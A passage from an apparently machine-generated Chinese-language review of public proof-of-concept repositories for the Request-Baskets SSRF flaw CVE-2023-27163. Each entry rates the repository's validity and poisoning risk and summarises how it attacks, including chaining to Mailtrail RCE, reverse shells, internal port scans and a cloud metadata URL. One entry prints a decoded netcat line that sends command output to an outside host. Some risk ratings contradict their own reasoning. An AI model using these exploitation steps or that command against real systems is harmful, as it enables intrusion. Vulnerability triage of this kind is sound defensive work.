1.  **mailtrail函数 (SSRF触发):** 首先，通过`mailtrail`函数，向`/api/baskets/pwned`发送POST请求，创建一个新的basket或者修改已存在的basket。请求的body包含`forward_url`参数，该参数指向攻击者控制的服务器（在`exploit.py`中，尝试指向`http://127.0.0.1:80/`，实际攻击中需要替换为攻击者控制的服务器），并设置`proxy_response`为`True`，这导致request-baskets会将请求转发到`forward_url`，从而触发SSRF。
2.  **exploit函数 (反弹shell):** 然后，利用`exploit`函数，向`/pwned/login`（`/pwned`是之前`mailtrail`创建的basket名字）发送POST请求。POST请求的body中的`username`参数包含一段bash代码，该代码首先将一段base64编码的payload解码，然后执行。该payload是一个python反弹shell脚本，它会连接攻击者指定的IP地址和端口，并将shell重定向到该连接。`os.system`函数执行的command将payload作为参数传递给`curl`，进一步通过shell进行执行。

**有效性:** 根据github和PacketstormSecurity的搜索结果，存在公开可用的POC代码，并且`exploit.py`代码看起来也实现了该POC的逻辑。因此，该POC代码应该是有效的。

**投毒风险:** 仔细分析了`exploit.py`的代码，未发现任何明显的投毒代码。该脚本的主要功能是利用SSRF漏洞触发反弹shell，其行为与漏洞描述一致。脚本中没有额外的恶意操作，例如删除文件、窃取凭据或安装后门。用于反弹shell的python代码虽然可以用来执行任意命令，但这是漏洞利用的一部分，不能算作投毒。所有操作都围绕着利用SSRF漏洞获取shell的目的。因此，投毒风险为0%。

**项目地址:** [G4sp4rCS/htb-sau-automated](https://github.com/G4sp4rCS/htb-sau-automated)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #2

**来源**: [CVE-2023-27163-Hamibubu_CVE-2023-27163.md](../2023/CVE-2023-27163-Hamibubu_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内网资源访问

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets服务可访问，并且攻击者可以发送POST请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及之前版本中的一个 SSRF 漏洞。攻击者可以通过向 `/api/baskets/{name}` 发送特制的 API 请求，利用该漏洞发起服务器端请求伪造攻击。 

**有效性评估：**
根据漏洞库信息和搜索引擎结果，此漏洞的存在已得到确认，并且有公开可用的 PoC 代码。提供的 PoC 代码（CVE-2023-27163.py）看起来能够有效利用此漏洞。它允许攻击者指定一个目标 URL (`-t`) 和一个恶意 URL (`-e`)，然后创建一个新的 basket，并将其配置为将请求转发到恶意 URL。 这说明提供的POC代码有效。

**投毒风险分析：**
提供的代码主要包含以下几个文件：
*   `CVE-2023-27163.py`:  这是主要的 PoC 脚本，用于利用 SSRF 漏洞。脚本的逻辑是创建具有转发功能的 request-baskets，将流量转发到攻击者指定的 URL。
*   `README.md`:  包含脚本的使用说明。
*   `requirements.txt`:  列出了脚本所需的依赖项，只有 `requests>=2.25.1`，是一个常见的Python库。

没有发现明显的恶意代码。 但风险依然存在：

1.  **依赖风险：** `requirements.txt` 文件中声明了 `requests` 库。如果攻击者控制了上游 PyPI 仓库，并且能够投毒 `requests` 库，那么运行此脚本的用户可能会受到影响。此风险较低，因为 `requests` 是一个非常流行的库，任何投毒行为都会很快被发现。
2. **间接风险:**  虽然该POC本身没有发现恶意代码,但是使用者如果滥用此POC,比如扫描内网弱口令服务等,会造成更大的安全风险.

基于以上分析，我估计此仓库中存在作者隐藏的投毒代码的风险为 10%。主要是考虑到依赖项的潜在风险以及被滥用的可能。

**利用方式总结：**
1.  攻击者需要找到一个运行着易受攻击版本的 Request-Baskets 的服务器。
2.  攻击者使用 PoC 脚本（`CVE-2023-27163.py`）创建一个新的 basket，并设置 `forward_url` 参数为攻击者控制的恶意 URL。
3.  当有人访问新创建的 basket 时，Request-Baskets 服务器会向攻击者指定的 URL 发起请求，从而允许攻击者执行 SSRF 攻击，例如访问内部服务或泄露敏感信息。
4.  通过设置不同的 URL, 可以探测内网端口开放, 访问内网服务,甚至可以通过内网服务进行进一步的攻击。

**项目地址:** [Hamibubu/CVE-2023-27163](https://github.com/Hamibubu/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #3

**来源**: [CVE-2023-27163-HusenjanDev_CVE-2023-27163-AND-Mailtrail-v0.53.md](../2023/CVE-2023-27163-HusenjanDev_CVE-2023-27163-AND-Mailtrail-v0.53.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 高危，可泄露内部信息，甚至可能造成远程代码执行

**影响版本:** <= 1.2.1

**利用条件:** 目标Request Baskets服务可访问，且内部可能存在其他服务（如Mailtrail v0.53）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及之前版本中的一个 SSRF 漏洞。攻击者通过构造恶意的 API 请求到 `/api/baskets/{name}`，可以强制服务器向任意 URL 发起请求，从而访问内部网络资源。 

**漏洞利用方式：**

1.  **创建Basket并配置转发：**  利用 Request Baskets 的 API 创建一个新的 basket (例如 `pwned`)，并配置其 `forward_url` 指向内部服务 (如 `http://127.0.0.1:80/`，这里指向的是 Mailtrail)。
2.  **触发转发：**  访问创建的 basket (例如 `/pwned`)，这将导致 Request Baskets 服务器将请求转发到内部服务。
3.  **结合其他漏洞进行利用：**  如果内部服务存在其他漏洞（如Mailtrail v0.53 的远程代码执行漏洞），则可以进一步利用 SSRF 漏洞，例如通过访问 `/pwned/login` 并注入恶意payload来执行任意命令。
4.  **反弹shell：**  POC代码中，攻击者首先通过SSRF将内部Mailtrail服务暴露到`/pwned`，然后通过构造特定的URL，触发Mailtrail的RCE漏洞，从而反弹shell。

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此POC代码**有效**。它演示了如何利用 Request Baskets 的 SSRF 漏洞，结合 Mailtrail 的漏洞，实现远程代码执行。

**投毒风险：**

POC代码相对清晰，主要逻辑是利用SSRF和RCE进行攻击。但是，`exploit.py`中直接使用`os.system(command)`执行命令存在一定风险。虽然当前command是为了反弹shell，但理论上如果`LISTENING_IP`和`LISTENING_PORT`被恶意修改，依然可以通过该命令执行其他任意操作，造成潜在的风险。

因此，判断投毒风险为10%。主要考虑是`os.system()`执行命令的潜在危险，以及代码来源的不可完全信任性。

**项目地址:** [HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53](https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #4

**来源**: [CVE-2023-27163-J0ey17_Exploit_CVE-2023-27163.md](../2023/CVE-2023-27163-J0ey17_Exploit_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及之前版本中的一个服务器端请求伪造（SSRF）漏洞。该漏洞位于`/api/baskets/{name}`组件中，允许攻击者通过构造恶意的API请求来访问网络资源和敏感信息。

**有效性评估：**

提供的PoC代码通过以下步骤利用该漏洞：

1.  **创建Basket：** PoC脚本首先创建一个具有随机名称的basket。
2.  **获取API Token：** 然后获取与该basket关联的API token，用于后续的身份验证。
3.  **配置Basket转发URL：**  使用PUT请求，将`forward_url`设置为`http://127.0.0.1:{port}/`，其中`{port}`是一个端口范围（75-81）。这会将发送到basket的所有请求转发到目标服务器（即运行Request-Baskets的服务器）上的指定端口。
4.  **发起请求：** 使用GET请求访问basket的URL，从而触发服务器端请求伪造。  如果目标端口上有服务运行，则PoC会打印该服务的响应。

此方法允许攻击者扫描目标服务器上的内部端口，并获取在这些端口上运行的服务的响应。根据漏洞描述和搜索结果中的信息，该PoC代码被认为是有效的。

**投毒风险评估：**

PoC代码本身相对简单，主要功能是利用SSRF漏洞扫描本地端口。以下几点需要注意：

*   **依赖关系：** 该脚本只依赖于requests库，这是一个常用的Python库，本身不太可能包含恶意代码。
*   **代码逻辑：** PoC的主要逻辑是发送HTTP请求，没有发现可疑的系统调用或文件操作。
*   **潜在风险：** 攻击者可能会修改`forward_url`以访问其他内部服务或执行更严重的操作，但这属于漏洞利用的范畴，而不是代码投毒。

根据对代码的分析，投毒风险较低，估计为5%。 主要风险来自于使用者如果未充分理解代码，直接运行或者修改`forward_url`参数，可能造成的非预期后果。

**利用方式：**

1.  **攻击者首先需要访问存在漏洞的Request-Baskets服务。**
2.  **攻击者构造一个包含目标内部地址（例如`127.0.0.1`或内部网络地址）的`forward_url`的PUT请求，以配置一个basket。** 这实质上是将Request-Baskets服务器配置为代理攻击者的请求。
3.  **攻击者发送一个GET请求到配置的basket URL。** Request-Baskets服务器将根据配置将此请求转发到内部地址。
4.  **如果内部地址存在服务，Request-Baskets服务器将返回该服务的响应给攻击者，从而泄露内部信息。**

通过这种方式，攻击者可以绕过防火墙和其他安全措施，访问通常无法从外部访问的内部服务，从而进行端口扫描、服务发现或获取敏感数据。

**项目地址:** [J0ey17/Exploit_CVE-2023-27163](https://github.com/J0ey17/Exploit_CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #5

**来源**: [CVE-2023-27163-KharimMchatta_basketcraft.md](../2023/CVE-2023-27163-KharimMchatta_basketcraft.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络资源访问和敏感信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行存在漏洞的Request-Baskets服务，且攻击者能够发送HTTP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞信息和搜索结果，CVE-2023-27163是Request-Baskets 1.2.1及之前版本中存在的一个服务器端请求伪造（SSRF）漏洞，位于`/api/baskets/{name}`组件。该漏洞允许攻击者通过构造恶意的API请求来访问内部网络资源和敏感信息。

**有效性评估：**
提供的漏洞利用代码 `basketcraft.sh` 似乎是有效的，因为它旨在自动化利用该SSRF漏洞的过程。它通过提示用户输入目标URL、basket名称和攻击者IP地址，构建一个包含恶意`forward_url`的JSON payload，然后使用curl发送POST请求来创建basket。创建成功后，脚本会输出token，并使用curl再次请求创建的basket URL来触发SSRF。如果成功，Request-Baskets将会向攻击者指定的IP地址和端口发起请求，攻击者可以使用Netcat监听该端口来验证漏洞利用。

**投毒风险评估：**
代码存在轻微的投毒风险。风险点主要在于脚本依赖用户输入`attackerip`。虽然这本身不是恶意代码，但如果攻击者在不知情的情况下运行该脚本，并在`attackerip`处输入了恶意IP，那么该恶意IP可能获取目标服务器的信息。因此，存在一定的欺骗性，让用户无意间参与攻击行为。另外该脚本也存在可读性问题和缺少详细注释等。因此，投毒风险评估为10%。

**漏洞利用方式：**
1.  **创建Basket：** 攻击者使用POST请求向`/api/baskets/{name}`发送请求，其中`{name}`是basket的名称。
2.  **构造Payload：** 在POST请求的body中，攻击者会构造一个JSON payload，其中包含`forward_url`字段。`forward_url`指向攻击者想要访问的内部资源，例如`http://internal_server:8080/admin`。
3.  **触发SSRF：** 当Request-Baskets收到发送到该basket的请求时，它会将该请求转发到`forward_url`指定的地址，从而触发SSRF漏洞。
4.  **信息获取：** 如果成功，攻击者可以通过Netcat监听端口来捕获来自目标服务器的响应，或者访问原本无法访问的内部服务。

总之，该漏洞利用方式相对简单，但可能需要一些社会工程学技巧才能诱使目标用户运行包含恶意`attackerip`的脚本。

**项目地址:** [KharimMchatta/basketcraft](https://github.com/KharimMchatta/basketcraft)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #6

**来源**: [CVE-2023-27163-MasterCode112_CVE-2023-27163.md](../2023/CVE-2023-27163-MasterCode112_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务器运行存在漏洞的Request-Baskets实例，且攻击者可以访问该实例。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及以前版本中存在的服务器端请求伪造 (SSRF) 漏洞。通过向 `/api/baskets/{name}` 组件发送特制的 API 请求，攻击者可以强制服务器向任意目标发起请求。根据漏洞利用代码，攻击者通过创建一个包含 `forward_url` 参数的 basket，该参数指向攻击者控制的服务器或内部网络资源。服务器会代理所有发送到该 basket 的请求到 `forward_url` 指定的地址。

**有效性：**
根据提供的漏洞信息，搜索引擎结果，以及漏洞利用代码，可以判断该漏洞是有效的，并且存在公开的POC。

**投毒风险：**
提供的脚本 `CVE-2023-27163.sh` 主要功能是创建具有转发功能的“basket”。虽然脚本本身没有明显的恶意代码，但用户在使用时需要注意以下几点：

1.  **目标服务器：**  脚本允许指定任意 `TARGET` 作为转发目标。如果攻击者控制了公共 Request-Baskets 实例，并将其转发到恶意服务器，则可能窃取用户的请求数据。
2.  **依赖外部命令：**  脚本依赖于 `curl` 和 `jq` 命令。如果这些命令被恶意替换，则可能执行恶意代码。但这种风险并非脚本本身引入，而是系统环境的风险。
3.  **创建的 Basket 长期存在：**  一旦创建了具有转发功能的 Basket，它将一直存在，除非被手动删除。如果攻击者创建了一个长期存在的恶意 Basket，可能会持续地捕获用户的请求。

由于脚本功能本身是利用漏洞进行请求转发，因此不能简单地将所有风险都归结为“投毒”。投毒风险主要来自于用户对脚本使用的环境和目标的信任程度。如果用户从不可信的来源下载脚本，或者将其应用于不可信的 Request-Baskets 实例，则存在一定的风险。此外，README.md 文件中的示例命令没有问题。

**利用方式：**
1.  攻击者使用 PoC 脚本创建一个恶意的 basket，并指定内部服务（例如，只能从本地访问的数据库管理界面）的 URL 作为 `forward_url`。
2.  当受害者（例如，管理员）访问该 basket 的 URL 时，Request-Baskets 服务器会向内部服务发起请求，并将响应返回给攻击者。
3.  通过这种方式，攻击者可以绕过防火墙或其他访问控制机制，访问内部网络资源。
4.  攻击者还可以使用该漏洞来探测内部网络，发现潜在的攻击目标。

**项目地址:** [MasterCode112/CVE-2023-27163](https://github.com/MasterCode112/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #7

**来源**: [CVE-2023-27163-Rishabh-Kumar-Cyber-Sec_CVE-2023-27163-ssrf-to-port-scanning.md](../2023/CVE-2023-27163-Rishabh-Kumar-Cyber-Sec_CVE-2023-27163-ssrf-to-port-scanning.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致信息泄露和内部网络访问

**影响版本:** <= 1.2.1

**利用条件:** 需要访问Request-Baskets服务的权限，利用需要目标服务的域名或者IP地址。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 版本及之前版本中存在的一个服务器端请求伪造（SSRF）漏洞，位于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意 API 请求来访问内部网络资源和敏感信息。

**有效性：**
提供的 Python 脚本 `ssrf-to-port-scan.py` 利用了该漏洞，通过修改指定 Basket 的 `forward_url` 参数来触发 SSRF。脚本尝试扫描目标主机（默认为 `127.0.0.1`）的 1 到 65535 端口。如果端口关闭，则响应包含 "Failed to forward request" 字符串，脚本会打印 "Port closed"。否则，脚本会打印 "Port Open"。根据漏洞描述和脚本逻辑，可以判断该POC代码是有效的。

**投毒风险：**
审阅提供的 Python 脚本后，没有发现明显的恶意代码或后门。脚本的功能主要集中在利用 SSRF 漏洞进行端口扫描。代码行为符合预期，没有发现隐藏的、非预期的网络连接、文件操作或其他可疑行为。脚本注释中有少量需要修改的行数，以及对漏洞利用方式的简单解释，都是正常的提示信息。脚本存在明显的漏洞利用行为，但没有发现投毒代码。

**利用方式：**
1.  攻击者需要先获得对 Request-Baskets 服务的访问权限。
2.  攻击者需要创建一个 Basket 或者利用已存在的 Basket (例如，代码中使用的 `xfnq3md`)。
3.  攻击者通过 PUT 请求修改 Basket 的配置，将 `forward_url` 设置为攻击者想要访问的内部网络地址和端口。payload 可以通过json格式传递.
4.  当有用户访问该 Basket 时（例如，通过 GET 请求 `http://10.10.11.224:55555/xfnq3md`），Request-Baskets 服务会尝试将请求转发到 `forward_url` 指定的地址。
5.  如果 `forward_url` 指向内部服务，攻击者就可以通过 Request-Baskets 服务作为跳板来访问这些服务，从而实现 SSRF 攻击。

脚本使用 `proxy_response=True` 使得响应内容也会返回，因此可以判断端口是否开放。

**总结：**
该漏洞利用方式清晰，POC 代码有效，用于端口扫描。没有发现明显的投毒风险。攻击者需要能够访问 Request-Baskets 服务，并且能够操纵 Basket 的配置才能成功利用该漏洞。

**项目地址:** [Rishabh-Kumar-Cyber-Sec/CVE-2023-27163-ssrf-to-port-scanning](https://github.com/Rishabh-Kumar-Cyber-Sec/CVE-2023-27163-ssrf-to-port-scanning)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #8

**来源**: [CVE-2023-27163-Rubioo02_CVE-2023-27163.md](../2023/CVE-2023-27163-Rubioo02_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络信息泄露，甚至通过间接方式进行攻击。

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163是Request-Baskets 1.2.1及更早版本中存在的服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造特定的API请求，利用/api/baskets/{name}组件来访问内部网络资源或敏感信息。 

**利用方式：**

1.  攻击者使用提供的POC脚本，指定目标Request-Baskets服务器的URL和攻击者控制的URL。
2.  脚本会在Request-Baskets服务器上创建一个新的basket，并将`forward_url`设置为攻击者指定的URL。
3.  `proxy_response`设置为`true`，表示Request-Baskets会将从攻击者URL收到的响应返回给发起原始请求的客户端。
4.  攻击者随后向创建的basket发送请求。Request-Baskets服务器会将该请求转发到攻击者指定的URL。
5.  攻击者可以利用这一点来扫描内部网络，或访问受保护的资源。

**有效性：**

根据漏洞库信息和搜索结果，以及提供的POC代码，该漏洞是有效的。多个来源都提供了PoC，证明了漏洞的可利用性。

**投毒风险：**

提供的脚本主要功能是创建basket并设置forward_url，以实现SSRF攻击。检查了脚本内容，没有明显的恶意代码或后门，诸如反弹shell，植入挖矿程序等行为。但是，该脚本可能会被修改为包含恶意功能，因此存在一定的投毒风险，初步判断该仓库存在投毒代码的概率约为5%。使用该脚本的人员应仔细审查代码，确保其安全性。

**项目地址:** [Rubioo02/CVE-2023-27163](https://github.com/Rubioo02/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #9

**来源**: [CVE-2023-27163-ThickCoco_CVE-2023-27163-POC.md](../2023/CVE-2023-27163-ThickCoco_CVE-2023-27163-POC.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内部网络访问

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets服务可访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中的一个服务器端请求伪造（SSRF）漏洞。该漏洞存在于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意的 API 请求，使服务器代表其向任意 URL 发起请求，从而访问内部网络资源或获取敏感信息。

**利用方式：**

1.  攻击者创建一个包含 `forward_url` 参数的恶意请求，该参数指向攻击者想要访问的内部或外部 URL。
2.  攻击者将此请求发送到 `/api/baskets/{name}` 端点，其中 `{name}` 是一个任意的 basket 名称。
3.  Request-Baskets 服务会向 `forward_url` 指定的 URL 发起请求，并将响应返回给攻击者。

提供的 PoC 代码 `CVE-2023-27163.py` 演示了如何利用此漏洞。它通过以下步骤工作：

1.  使用 `argparse` 处理命令行参数，包括目标 Request-Baskets 服务的 URL、目标 URL 和字典文件路径。
2. 从字典文件读取URL, 使用提供的目标 URL 和 wordlist 中的每一行来构建要fuzzing的 URL.
3.  构造一个包含 `forward_url` 的 JSON payload，并将其发送到 `/api/baskets/{name}` 端点以创建一个新的 basket。
4.  提取创建 basket 时返回的 token。
5.  再次使用该Payload进行Post请求.
6.  发送带有 token 的 GET 请求到创建的 basket，触发 SSRF。
7.  检查响应状态码。如果状态码为 200，则打印响应内容，表示攻击成功。
8.  删除创建的 basket。

**投毒风险：**

虽然代码主要功能是利用 SSRF 漏洞，但仍存在少量投毒风险。

*   **依赖管理风险：** PoC代码依赖 `requests` 库，恶意维护者可能通过植入后门版本导致攻击者受到攻击。此类风险概率较低，但后果严重，故评估为 5%。
*   **潜在的恶意 Wordlist：** PoC 使用了用户提供的 wordlist 文件。如果 wordlist 文件被篡改，包含恶意 URL，则可能导致攻击者在扫描内部网络时意外触发其他漏洞或服务，造成不必要的损害。

总体来说，该 PoC 代码的主要功能是 SSRF 利用，投毒风险较低，主要集中在依赖项和 wordlist 上。

**项目地址:** [ThickCoco/CVE-2023-27163-POC](https://github.com/ThickCoco/CVE-2023-27163-POC)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #10

**来源**: [CVE-2023-27163-btar1gan_exploit_CVE-2023-27163.md](../2023/CVE-2023-27163-btar1gan_exploit_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致敏感信息泄露，内网端口扫描，访问内部服务

**影响版本:** <= 1.2.1

**利用条件:** 需要网络访问，目标应用运行request-baskets <= 1.2.1，并允许创建和访问basket。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163是Request Baskets 1.2.1版本及以下版本中存在的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造恶意的API请求，利用`/api/baskets/{name}`组件发起对内部或外部资源的请求，从而读取敏感信息或攻击其他内部服务。

**有效性分析：**
根据搜索引擎结果和漏洞库信息，该漏洞的POC已公开。提供的POC代码看起来不像是直接攻击`/api/baskets/{name}`这个SSRF端点，而是尝试利用登录页面进行命令注入。这可能是在没有权限创建basket的情况下进行的尝试，或者该实例的配置允许登录。

**投毒风险分析：**
给定的POC代码尝试使用`echo ... | base64 -d | sh`来执行命令，这是一种常见的反弹shell的方式。username参数的值被拼接成了一个shell命令，该命令将一段base64编码的字符串解码后通过sh执行。如果攻击成功，则会在目标服务器上执行任意命令。因此，**存在投毒风险**。`echo` 和 `base64` 是Linux常见的命令，payload部分`aWR8bmMgMTkyLjE2OC40NS4yNDkgODA=`解码后是`id|nc 192.168.45.249 80`，这明显是尝试执行命令并且反弹shell。因此存在投毒风险。由于 POC 本身就是一个反弹shell的尝试，因此判定投毒概率为 10%，主要是考虑命令注入点不一定是预期点。

**利用方式：**
1.  攻击者找到存在漏洞的Request Baskets实例。
2.  攻击者利用`/api/baskets/{name}`组件，构造包含恶意URL的请求。
3.  Request Baskets服务器解析该URL并向目标服务器发起请求。
4.  攻击者可以读取目标服务器返回的内容，或者利用目标服务器的漏洞进行进一步的攻击。根据本次提供的漏洞利用代码，是尝试通过登录界面的username参数进行命令注入，来获取权限后进行利用。

**项目地址:** [btar1gan/exploit_CVE-2023-27163](https://github.com/btar1gan/exploit_CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #11

**来源**: [CVE-2023-27163-cowsecurity_CVE-2023-27163.md](../2023/CVE-2023-27163-cowsecurity_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内网访问

**影响版本:** <= 1.2.1

**利用条件:** 需要Request Baskets服务可用，攻击者需要知道目标Request Baskets服务的URL

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-27163是Request Baskets 1.2.1及之前版本中的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造恶意的API请求，利用`/api/baskets/{name}`组件来访问内部网络资源和敏感信息。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的存在已被确认，并且有多个PoC代码可用。提供的PoC代码通过创建一个新的basket，并将`forward_url`设置为攻击者的服务器，来触发SSRF漏洞。当有人访问新创建的basket时，Request Baskets服务器将向攻击者的服务器发起请求。

**投毒风险：**

查看PoC代码，该代码主要功能是利用SSRF漏洞，没有发现明显的恶意代码或后门。`requirements.txt`文件只包含`requests`和`pyfiglet`两个常用的库，没有发现异常依赖。`README.md`文件提供的是关于漏洞的描述，安装方法和使用方法，也没有包含恶意代码。但考虑到任何代码都存在潜在风险，此处判定存在极低的投毒风险，约为1%。

**利用方式：**

1.  **部署Request Baskets:** 首先，需要部署一个存在漏洞的Request Baskets实例（版本<= 1.2.1）。
2.  **运行PoC脚本:** 运行提供的Python脚本`CVE-2023-27163.py`，指定目标Request Baskets服务的URL和攻击者的服务器URL。
3.  **创建恶意Basket:** 脚本会创建一个新的basket，并将`forward_url`设置为攻击者的服务器。
4.  **触发SSRF:** 任何访问新创建的basket的用户都会导致Request Baskets服务器向攻击者的服务器发起请求。攻击者可以在其服务器上捕获这些请求，并获取敏感信息，或者利用这些请求访问内部网络资源。

例如，攻击者可以将`attack_server`设置为内部服务的地址，例如`http://169.254.169.254/latest/meta-data`来获取云服务器的元数据。


**项目地址:** [cowsecurity/CVE-2023-27163](https://github.com/cowsecurity/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #12

**来源**: [CVE-2023-27163-davuXVI_CVE-2023-27163.md](../2023/CVE-2023-27163-davuXVI_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 高危，可能导致内部网络信息泄露、敏感信息访问，甚至远程代码执行。

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行Request Baskets，并且攻击者能够发送HTTP请求到目标服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及更早版本中的一个服务器端请求伪造 (SSRF) 漏洞。该漏洞存在于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意的 API 请求，利用 `forward_url` 参数发起对内部或外部资源的请求。

**漏洞利用方式：**

1.  攻击者创建一个新的 basket，并在创建时通过 `forward_url` 指定一个恶意 URL。Request Baskets 将会尝试请求这个 URL。
2.  攻击者可以利用此漏洞读取内部服务的信息，例如元数据 API、数据库等。
3.  结合其他漏洞，例如利用Request Basket的路径遍历，在`rce_end`函数中通过python开启web服务，利用`wget`来执行攻击者服务器上的shell脚本`rev.sh`，从而实现远程代码执行。

**有效性：**

提供的PoC 代码看起来是有效的。该脚本接受目标 IP 地址、转发 IP 地址和攻击者 IP 地址作为参数。它首先创建一个带有 `forward_url` 的 basket，然后通过HTTP服务暴露反弹shell脚本，并通过request basket的路径遍历漏洞和wget命令执行反弹shell，实现RCE。

**投毒风险：**

该脚本的主要目的是利用 SSRF 漏洞实现 RCE，其中`my_script.sh`脚本在`/tmp/5d6d5c10a3b6d097d6e642a3dc9d71b8/my_script_CVE-2023-27163.sh`文件中。

*   **轻微的投毒可能:** 代码中存在使用 Python 启动 HTTP 服务器并执行 shell 命令的部分，如果攻击者的服务器被攻陷，可能会导致受害者下载并执行恶意的 shell 脚本，造成进一步的损害。或者反弹shell的ip地址被替换为恶意地址。
*   **可疑之处:**  脚本将反弹 shell 命令写入 `rev.sh` 文件，然后通过 Python 的 `http.server` 模块提供该文件。虽然这是一个利用漏洞的正常步骤，但也可能被用于传播恶意代码。

由于脚本需要用户提供攻击者的 IP 地址，并且主要目的是为了利用漏洞，因此投毒的概率相对较低，估计在 10% 左右。

**项目地址:** [davuXVI/CVE-2023-27163](https://github.com/davuXVI/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #13

**来源**: [CVE-2023-27163-entr0pie_CVE-2023-27163.md](../2023/CVE-2023-27163-entr0pie_CVE-2023-27163.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** request-baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

